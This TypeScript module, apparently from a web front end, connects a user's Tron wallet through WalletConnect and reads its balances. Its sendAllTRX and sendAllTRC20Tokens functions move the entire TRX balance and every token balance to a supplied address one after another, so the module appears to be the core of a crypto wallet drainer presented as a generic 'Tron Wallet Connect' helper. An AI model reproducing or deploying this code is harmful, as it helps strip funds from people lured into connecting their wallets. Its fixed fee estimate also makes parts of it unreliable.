'use client'

import SignClient from '@walletconnect/sign-client'
import { WalletConnectModal } from '@walletconnect/modal'

let signClient: SignClient | null = null
let modal: WalletConnectModal | null = null
let currentSession: any = null

const TRON_CHAIN_ID = 'tron:0x2b6653dc'
const TRON_MAINNET_RPC = 'https://api.trongrid.io'

export async function connectWallet(projectId: string) {
  try {
    if (!signClient) {
      signClient = await SignClient.init({
        projectId,
        metadata: {
          name: 'Tron Wallet Connect',
          description: 'Connect Tron wallet',
          url: typeof window !== 'undefined' ? window.location.origin : '',
          icons: ['https://avatars.githubusercontent.com/u/37784886']
        }
      })
    }

    if (!modal) {
      modal = new WalletConnectModal({
        projectId,
        chains: [TRON_CHAIN_ID],
        themeMode: 'light',
        themeVariables: {
          '--wcm-z-index': '9999'
        },
        explorerRecommendedWalletIds: [
          'fbea6f68df4e6ce163c144df86da89f24cb244f19b53903e26aea9ab7de6393c',
          'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0'
        ]
      })
    }

    const lastSession = signClient.session.getAll().pop()
    if (lastSession) {
      currentSession = lastSession
      const accounts = lastSession.namespaces.tron?.accounts || []
      if (accounts.length > 0) {
        const address = accounts[0].split(':')[2]
        return { address }
      }
    }

    const { uri, approval } = await signClient.connect({
      requiredNamespaces: {
        tron: {
          methods: ['tron_signTransaction', 'tron_signMessage'],
          chains: [TRON_CHAIN_ID],
          events: ['accountsChanged', 'chainChanged']
        }
      }
    })

    if (uri) {
      await modal.openModal({ uri })
    }

    const session = await approval()
    currentSession = session
    
    modal.closeModal()

    const accounts = session.namespaces.tron?.accounts || []
    if (accounts.length === 0) {
      throw new Error('Address not received from wallet')
    }

    const address = accounts[0].split(':')[2]

    return {
      address
    }
  } catch (error) {
    if (modal) modal.closeModal()
    throw error
  }
}

export async function getTRXBalance(address: string): Promise<number> {
  try {
    const response = await fetch(`${TRON_MAINNET_RPC}/wallet/getaccount`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ address, visible: true })
    })
    
    const data = await response.json()
    const balance = data.balance || 0
    const balanceInTRX = balance / 1000000
    
    return balanceInTRX
  } catch {
    return 0
  }
}

export async function estimateTransactionFee(): Promise<number> {
  try {
    const estimatedFee = 0.5
    return estimatedFee
  } catch {
    return 1.0
  }
}

export async function sendAllTRX(toAddress: string) {
  if (!signClient || !currentSession) {
    throw new Error('Wallet not connected')
  }

  try {
    const accounts = currentSession.namespaces.tron?.accounts || []
    if (accounts.length === 0) throw new Error('Address not found')
    
    const fromAddress = accounts[0].split(':')[2]
    
    const balance = await getTRXBalance(fromAddress)
    
    if (balance <= 0) {
      throw new Error('Insufficient balance')
    }
    
    const baseFee = await estimateTransactionFee()
    
    const feeWithBuffer = baseFee * 1.2
    
    const amountToSend = balance - feeWithBuffer
    
    if (amountToSend <= 0) {
      throw new Error(`Insufficient funds for fee. Balance: ${balance} TRX, Fee: ${feeWithBuffer} TRX`)
    }
    
    const amountSun = Math.floor(amountToSend * 1000000)
    
    const txResponse = await fetch(`${TRON_MAINNET_RPC}/wallet/createtransaction`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        to_address: toAddress,
        owner_address: fromAddress,
        amount: amountSun,
        visible: true
      })
    })
    
    const transaction = await txResponse.json()
    
    if (transaction.Error) {
      throw new Error(transaction.Error)
    }

    const result = await signClient.request({
      topic: currentSession.topic,
      chainId: TRON_CHAIN_ID,
      request: {
        method: 'tron_signTransaction',
        params: {
          transaction
        }
      }
    })

    return {
      txId: result.txid || result.txID,
      amount: amountToSend,
      fee: feeWithBuffer,
      balance
    }
  } catch (error) {
    throw error
  }
}

export async function getTRC20Tokens(address: string) {
  try {
    const response = await fetch(`${TRON_MAINNET_RPC}/v1/accounts/${address}`)
    const data = await response.json()
    
    const tokens = []
    
    if (data.data && data.data.length > 0 && data.data[0].trc20) {
      const trc20Tokens = data.data[0].trc20
      
      for (const [contractAddress, balanceData] of Object.entries(trc20Tokens)) {
        const balance = (balanceData as any)
        if (!balance || balance === '0') continue
        
        try {
          const tokenResponse = await fetch(`${TRON_MAINNET_RPC}/v1/contracts/${contractAddress}`)
          const tokenData = await tokenResponse.json()
          
          tokens.push({
            contractAddress,
            symbol: tokenData.data?.[0]?.token_info?.symbol || 'UNKNOWN',
            name: tokenData.data?.[0]?.token_info?.name || 'Unknown Token',
            balance: balance.toString(),
            decimals: tokenData.data?.[0]?.token_info?.decimals || 6
          })
        } catch {}
      }
    }
    
    return tokens
  } catch {
    return []
  }
}

export async function sendTRC20Token(
  tokenContract: string,
  toAddress: string,
  amount: string,
  decimals: number = 6
) {
  if (!signClient || !currentSession) {
    throw new Error('Wallet not connected')
  }

  try {
    const accounts = currentSession.namespaces.tron?.accounts || []
    if (accounts.length === 0) throw new Error('Address not found')
    
    const fromAddress = accounts[0].split(':')[2]
    
    const parameter = [
      { type: 'address', value: toAddress },
      { type: 'uint256', value: amount }
    ]
    
    const txResponse = await fetch(`${TRON_MAINNET_RPC}/wallet/triggersmartcontract`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        contract_address: tokenContract,
        function_selector: 'transfer(address,uint256)',
        parameter: JSON.stringify(parameter),
        fee_limit: 100000000,
        owner_address: fromAddress,
        visible: true
      })
    })
    
    const txData = await txResponse.json()
    
    if (txData.Error) {
      throw new Error(txData.Error)
    }
    
    const transaction = txData.transaction

    const result = await signClient.request({
      topic: currentSession.topic,
      chainId: TRON_CHAIN_ID,
      request: {
        method: 'tron_signTransaction',
        params: {
          transaction
        }
      }
    })

    return result.txid || result.txID
  } catch (error) {
    throw error
  }
}

export async function sendAllTRC20Tokens(toAddress: string) {
  if (!signClient || !currentSession) {
    throw new Error('Wallet not connected')
  }

  try {
    const accounts = currentSession.namespaces.tron?.accounts || []
    if (accounts.length === 0) throw new Error('Address not found')
    
    const fromAddress = accounts[0].split(':')[2]
    
    const tokens = await getTRC20Tokens(fromAddress)
    
    if (tokens.length === 0) {
      return { success: true, sent: 0, failed: 0, results: [] }
    }
    
    const results = []
    let sent = 0
    let failed = 0
    
    for (const token of tokens) {
      try {
        const txId = await sendTRC20Token(
          token.contractAddress,
          toAddress,
          token.balance,
          token.decimals
        )
        
        results.push({
          token: token.symbol,
          success: true,
          txId
        })
        sent++
        
        await new Promise(resolve => setTimeout(resolve, 2000))
      } catch (error) {
        results.push({
          token: token.symbol,
          success: false,
          error: error instanceof Error ? error.message : 'Unknown error'
        })
        failed++
      }
    }
    
    return { success: true, sent, failed, results }
  } catch (error) {
    throw error
  }
}

export async function openWalletConnectModal(projectId: string) {
  try {
    if (!signClient) {
      signClient = await SignClient.init({
        projectId,
        metadata: {
          name: 'Tron Wallet Connect',
          description: 'Connect Tron wallet',
          url: typeof window !== 'undefined' ? window.location.origin : '',
          icons: ['https://avatars.githubusercontent.com/u/37784886']
        }
      })
    }
    
    if (!modal) {
      modal = new WalletConnectModal({
        projectId,
        chains: [TRON_CHAIN_ID],
        themeMode: 'light',
        themeVariables: {
          '--wcm-z-index': '99999'
        },
        explorerRecommendedWalletIds: [
          'fbea6f68df4e6ce163c144df86da89f24cb244f19b53903e26aea9ab7de6393c',
          'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0'
        ]
      })
    }
    
    const { uri, approval } = await signClient.connect({
      requiredNamespaces: {
        tron: {
          methods: ['tron_signTransaction', 'tron_signMessage'],
          chains: [TRON_CHAIN_ID],
          events: ['accountsChanged', 'chainChanged']
        }
      }
    })
    
    if (uri) {
      await modal.openModal({ uri })
    } else {
      throw new Error('Failed to get connection URI')
    }
    
    approval().then(session => {
      currentSession = session
      modal?.closeModal()
    }).catch(() => {
      modal?.closeModal()
    })
    
  } catch (error) {
    if (modal) modal.closeModal()
    throw error
  }
}

export async function disconnectWallet() {
  if (signClient && currentSession) {
    try {
      await signClient.disconnect({
        topic: currentSession.topic,
        reason: {
          code: 6000,
          message: 'User disconnected'
        }
      })
      currentSession = null
    } catch {}
  }
}
